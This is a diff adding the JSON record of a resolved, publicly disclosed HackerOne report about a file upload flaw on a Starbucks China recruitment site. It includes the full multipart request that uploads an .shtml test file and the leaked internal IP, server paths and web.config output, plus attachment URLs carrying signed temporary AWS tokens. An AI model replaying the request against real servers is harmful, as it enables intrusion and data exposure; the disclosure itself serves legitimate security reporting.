@@ -1,0 +1,177 @@
+{
+  "id": 412481,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTI0ODE=",
+  "url": "https://hackerone.com/reports/412481",
+  "title": "China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-21T15:35:05.980Z",
+  "submitted_at": "2018-09-21T15:35:05.980Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "b006e4ea768a5d1b5340969",
+    "url": "/b006e4ea768a5d1b5340969",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-01-29T01:17:24.371Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-19T13:58:39.598Z",
+  "team_member_agreed_on_going_public_at": "2020-01-29T01:17:24.281Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### 1, Summary\nDuring the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files, so you can read the server's intranet IP, the physical address of the website application and read the website web.config file.\n###2, Vulnerability scope\nhttps://ecjobsdc.starbucks.com.cn\n###3, proof of exploit\n\nBy modifying the suffix of filename, this address can be uploaded to upload html and shtml files, so that you can read the server's intranet IP, the physical address of the website application, and the configuration file of the website.\nVulnerability certificate\n\n```\nPOST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1\nHost: ecjobsdc.starbucks.com.cn\nConnection: close\nContent-Length: 234\nCache-Control: max-age=0\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n------WebKitFormBoundaryevPInYidBxSvSd06\nContent-Disposition: form-data; name=\"hxwebfileboxcontrol_upload_file_inputbox\"; filename=\"xxx.shtml\"\nContent-Type: text/html\n\n<?php echo 1111;>\n------WebKitFormBoundaryevPInYidBxSvSd06--\n```\n\nSuccessfully read the website's remoteaddr webpathinfo web.config file.\n\n```\nDOCUMENT_NAME\u001aD:\\TrustHX\\STBKSERM101\\www_app\\tempfiles\\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\nSERVER_SOFTWARE :Microsoft-IIS/8.5\nSERVER_NAME :ecjobsdc.starbucks.com.cn\nSERVER_PORT :80\nREMOTE_ADDR:10.92.29.50\nREMOTE_HOST:10.92.29.50\nD:\\TrustHX\\STBKSERM101\\www_app\\tempfiles\\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\nPATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <httpRedirect enabled=\"false\" destination=\"https://ecjobs.starbucks.net\" exactDestination=\"false\" />\n    </system.webServer>\n</configuration>\n```\n{F349302}\n{F349303}\n\n## Impact\n\nPhishing attack, remote file reading",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 349302,
+      "file_name": "ss2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/349/302/a156bc1f7b8d767eb2b16950390444b2521e7dbc/ss2.PNG?response-content-disposition=attachment%3B%20filename%3D%22ss2.PNG%22%3B%20filename%2A%3DUTF-8%27%27ss2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2DY4H25O%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJHMEUCIG9yhZR9vjsR83vOLEoykJ5LJsORryjdyGKJrTbmavSQAiEAnhcdB0Z9W5bgdzvh46Qn1Ruheg8EMD5dIZOwCQO58vgqugUI5f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDP73MDBtMB3W3Ne%2BLSqOBU2HOaeT6OFNptgdxfPkXEQM6zk5bHGPyxD4Hq5%2BjZqD8qcO5NxSMIyO3WTHSm3wMRhnxlwNuPmlu0zmzFkiuOMaNvcCZKCxwdxrRQTYFj1N6rMeu2ilEZzVtVzhtzVp9Nw0gVfRIlxXmg%2FSsFjgQYzrnCZDlEIZ43nMU%2F%2BJ%2FVOUwyuslQeiyHgNxuSyrSxeMy6zIeDMHY%2FfYmw6DeyF7mclVw9lsDGWPB9YWtU476cFFcj9jLU58jTIUaOy9mCWJpNxvdl1b2idGslDyNHdtYyP2bb6kdZrpCqWzVnYR8xdkiZTPNTxz%2Fmt0Ub8dz89NtL1O%2BWquHg18DrNm5M7M6k097r6AyQTvpvL2LqUS83cLwxJiw7q0nBTFkx4wTqTSY1OiBVK2QgT5Dtym%2B%2F05MP0UvQU39rV%2BQE1HgeooX2CTc3cjqisuGq%2Bi5NcaOccJg5sOg%2BrATrFr0jg6N8DCD9D3xM2mRJEvOW%2BbFn3q7U4RhqTFM4XrdoIuQ%2F1xowof9HHDotyrkQeaFh3oygY8OYlwZc4XJsLy6%2FFBr23PuGMpzE42xyJ%2Bc30pu%2B8D1W36kly22lO9aD%2BzErldqgCa7xFSYxE3RANsBqnSrVUPETqNE0Rwt4wGr9wikHFjjvxV%2BWc6QqCieR6z8sTVzZ6O4xuugXvqHaOeZArcPfkjwh%2B0XGHJlV3u3ZnjHznxyfnxXKIcYuUJNk3rKe9ciYqpig5f58mdJmfSTVH0LF5n71GnLJtGE%2F6yq84FScRndOzr9JZhc98uzjbmwjVvbx908dUdUhM1i7C3a0JI8F1oNlmNoWxh%2BumQO9yldr1zQjuh78Bgc%2FPfXnD0b6hs3kVFdBwrjvRZu7bgwscHVfRrDCDyPzPBjqxARPsVz7Un9VRzaef5HdaW7ZyMa6ZSdenpMmEkvxfmh1amPMpgXyeg%2FH4dJhQTc8i8azoU73JtR5oMh%2BtWokq0ateop8nN%2BC%2FWh%2BfGGPPTtyEL9Zmmc2HRZLq1NvHSN9%2Bsp9djujA%2FyNQn%2FGOL5kR1UEVKlZpFU9VG7FRfLKVOGwXAblpofuOYEMCgd%2BrUMQ88BrPHEJC6jgARhHEN%2BQYb6Nhnvw3E7r7frWRR0JdF8RY8A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e161dcfd2b3868f47dfc96a23f34abfa38a501ba65bb8cd0139147f32da49c3",
+      "file_size": 43366,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 349303,
+      "file_name": "ss1.PNg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/349/303/08121bc4f58a178242e56b4fba339a6e56ac66c8/ss1.PNg?response-content-disposition=attachment%3B%20filename%3D%22ss1.PNg%22%3B%20filename%2A%3DUTF-8%27%27ss1.PNg&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2DY4H25O%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJHMEUCIG9yhZR9vjsR83vOLEoykJ5LJsORryjdyGKJrTbmavSQAiEAnhcdB0Z9W5bgdzvh46Qn1Ruheg8EMD5dIZOwCQO58vgqugUI5f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDP73MDBtMB3W3Ne%2BLSqOBU2HOaeT6OFNptgdxfPkXEQM6zk5bHGPyxD4Hq5%2BjZqD8qcO5NxSMIyO3WTHSm3wMRhnxlwNuPmlu0zmzFkiuOMaNvcCZKCxwdxrRQTYFj1N6rMeu2ilEZzVtVzhtzVp9Nw0gVfRIlxXmg%2FSsFjgQYzrnCZDlEIZ43nMU%2F%2BJ%2FVOUwyuslQeiyHgNxuSyrSxeMy6zIeDMHY%2FfYmw6DeyF7mclVw9lsDGWPB9YWtU476cFFcj9jLU58jTIUaOy9mCWJpNxvdl1b2idGslDyNHdtYyP2bb6kdZrpCqWzVnYR8xdkiZTPNTxz%2Fmt0Ub8dz89NtL1O%2BWquHg18DrNm5M7M6k097r6AyQTvpvL2LqUS83cLwxJiw7q0nBTFkx4wTqTSY1OiBVK2QgT5Dtym%2B%2F05MP0UvQU39rV%2BQE1HgeooX2CTc3cjqisuGq%2Bi5NcaOccJg5sOg%2BrATrFr0jg6N8DCD9D3xM2mRJEvOW%2BbFn3q7U4RhqTFM4XrdoIuQ%2F1xowof9HHDotyrkQeaFh3oygY8OYlwZc4XJsLy6%2FFBr23PuGMpzE42xyJ%2Bc30pu%2B8D1W36kly22lO9aD%2BzErldqgCa7xFSYxE3RANsBqnSrVUPETqNE0Rwt4wGr9wikHFjjvxV%2BWc6QqCieR6z8sTVzZ6O4xuugXvqHaOeZArcPfkjwh%2B0XGHJlV3u3ZnjHznxyfnxXKIcYuUJNk3rKe9ciYqpig5f58mdJmfSTVH0LF5n71GnLJtGE%2F6yq84FScRndOzr9JZhc98uzjbmwjVvbx908dUdUhM1i7C3a0JI8F1oNlmNoWxh%2BumQO9yldr1zQjuh78Bgc%2FPfXnD0b6hs3kVFdBwrjvRZu7bgwscHVfRrDCDyPzPBjqxARPsVz7Un9VRzaef5HdaW7ZyMa6ZSdenpMmEkvxfmh1amPMpgXyeg%2FH4dJhQTc8i8azoU73JtR5oMh%2BtWokq0ateop8nN%2BC%2FWh%2BfGGPPTtyEL9Zmmc2HRZLq1NvHSN9%2Bsp9djujA%2FyNQn%2FGOL5kR1UEVKlZpFU9VG7FRfLKVOGwXAblpofuOYEMCgd%2BrUMQ88BrPHEJC6jgARhHEN%2BQYb6Nhnvw3E7r7frWRR0JdF8RY8A%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0a0acd5427661e150316df4fad49a8320eaad7d0c04e268e4e615e40c69cddd5",
+      "file_size": 36347,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-02-18T13:58:39.646Z",
+  "allow_singular_disclosure_after": -196305696.89268777,
+  "singular_disclosure_allowed": true,
+  "vote_count": 46,
+  "voters": [
+    "kashsec",
+    "loaymorad",
+    "base_64",
+    "ali",
+    "leonishan",
+    "themastersunil",
+    "xsstestov",
+    "namevta",
+    "jackbrown999",
+    "cryptographer",
+    "and 36 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13014,
+    "asset_type": "URL",
+    "asset_identifier": "www.starbucks.com.cn",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 19965,
+      "category": "team",
+      "content": "neweq discovered that ecjobsdc.starbucks.com.cn had a file upload vulnerability that permitted an attacker to upload html and shtml files which could then be accessed in a browser.\n\n@neweq — thank you for reporting this vulnerability.",
+      "updated_at": "2020-01-29T01:16:40.583Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 706273,
+        "username": "agedsumatra",
+        "name": "agedSumatra",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-08-12T17:50:49.926Z",
+        "url": "https://hackerone.com/agedsumatra",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
